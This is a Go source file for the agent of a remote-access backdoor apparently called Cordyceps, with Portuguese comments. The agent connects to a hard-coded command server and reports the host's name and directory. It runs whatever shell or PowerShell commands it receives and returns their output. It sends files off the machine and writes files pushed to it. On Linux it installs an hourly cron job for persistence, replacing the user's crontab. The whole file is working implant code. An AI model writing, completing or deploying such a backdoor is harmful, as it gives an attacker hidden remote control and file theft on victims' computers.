package main

import (
	commons "Cordyceps/commons/estruturas"
	"Cordyceps/commons/helpers"
	"encoding/gob"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

// Mensagens
var (
	mensagem    commons.Mensagem
	tempoEspera = 1
)

// Dados do Servidor
const (
	SERVIDOR = "127.0.0.1"
	PORTA    = "54321"
)

func CapturaUser() {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	// Obtém o nome de usuário
	username := currentUser.Username

	log.Println("Usuário atual:", username)
}

// Popula as Mensagens com os dados correto
func init() {
	mensagem.AgentHost, _ = os.Hostname()
	mensagem.AgentCWD, _ = os.Getwd()
	mensagem.AgentID = geraID()

}
func main() {
	if runtime.GOOS == "windows" {
		log.Println("Windows")
	} else if runtime.GOOS == "linux" {
		cronJobShell()
	} else {
		log.Println("MacOs")
	}
	log.Println("Executando Agent")
	CapturaUser()
	for {
		canal := conectaServidor()
		//Enviando a mensagem
		gob.NewEncoder(canal).Encode(mensagem)
		//Limpar as mensagens
		mensagem.Comandos = []commons.Commando{}

		//Recebendo a mensagem
		gob.NewDecoder(canal).Decode(&mensagem)
		if mensagemContemComandos(mensagem) {
			for indice, comando := range mensagem.Comandos {
				mensagem.Comandos[indice].Resposta = executaComando(comando.Comando, indice)
			}
		}

		time.Sleep(time.Duration(tempoEspera) * time.Second)
		defer canal.Close()
	}

}
func cronJobShell() error {
	// Definir o comando a ser adicionado ao cronjob
	command := "./agent.go"
	currentUser, err := user.Current()
	if err != nil {
		return err
	}
	homeDir := currentUser.HomeDir
	// Criar o comando cron
	cronCommand := fmt.Sprintf("@hourly cd %s && %s", homeDir+"/tmp", command)

	// Adicionar o novo cronjob
	cmd := exec.Command("bash", "-c", fmt.Sprintf("echo \"%s\" | crontab -", cronCommand))
	cmd.Run()
	if err != nil {
		return err
	}

	return nil
}

func executaComando(comando string, indice int) (resposta string) {
	comandoSeparado := helpers.SeparaComando(comando)
	comandoBase := comandoSeparado[0]
	switch comandoBase {
	case "list":
		resposta = listaArquivos()
	case "pwd":
		resposta = listaDiretorioAtual()
	case "cd":
		if len(comandoSeparado[1]) > 0 {
			resposta = mudarDiretorio(comandoSeparado[1])
		}
	case "send":
		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
	case "get":
		resposta = enviarArquivoEmDisco(mensagem.Comandos[indice].Comando, indice)
	default:
		resposta = executaComandoEmShell(comando)
	}
	return resposta
}

func enviarArquivoEmDisco(comandoGet string, indice int) (resposta string) {
	var err error
	resposta = "File uploaded successfully"
	comandoSeparado := helpers.SeparaComando(comandoGet)

	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
	if err != nil {
		resposta = "Error downloading the file" + err.Error()
	}
	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]
	mensagem.Comandos[indice].Arquivo.Erro = true
	return resposta
}
func salvaArquivoEmDisco(arquivo commons.Arquivo) (resposta string) {
	resposta = "Arquivo Enviado com Sucesso"
	err := os.WriteFile(arquivo.Nome, arquivo.Conteudo, 0644)
	if err != nil {
		resposta = "Error Saving File: Error" + err.Error()
	}
	return resposta
}
func executaComandoEmShell(comandoCompleto string) (resposta string) {
	if runtime.GOOS == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
		resposta = string(output)
	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		output, _ := exec.Command("bash", "-c", comandoCompleto).CombinedOutput()
		resposta = string(output)
	} else {
		resposta = "Target operating system not implemented"
	}

	return resposta
}

func mudarDiretorio(novoDiretorio string) (resposta string) {
	resposta = "Changed Directory"
	err := os.Chdir(novoDiretorio)
	if err != nil {
		resposta = "Directory Not Found"
	}
	return resposta
}

func listaDiretorioAtual() string {
	mensagem.AgentCWD, _ = os.Getwd()
	return mensagem.AgentCWD

}

func listaArquivos() (resposta string) {
	arquivos, _ := ioutil.ReadDir(mensagem.AgentCWD)
	for _, arquivo := range arquivos {
		resposta += arquivo.Name() + "\n"
	}

	return resposta
}
func mensagemContemComandos(mensagemdoServidor commons.Mensagem) (contem bool) {
	contem = false
	if len(mensagemdoServidor.Comandos) > 0 {
		contem = true
	}
	return contem
}

// Conecta no servidor usando TCP no Servidor + Porta
func conectaServidor() (canal net.Conn) {
	canal, _ = net.Dial("tcp", SERVIDOR+":"+PORTA)
	return canal
}

func geraID() string {
	hostname, _ := os.Hostname()
	return hostname

}
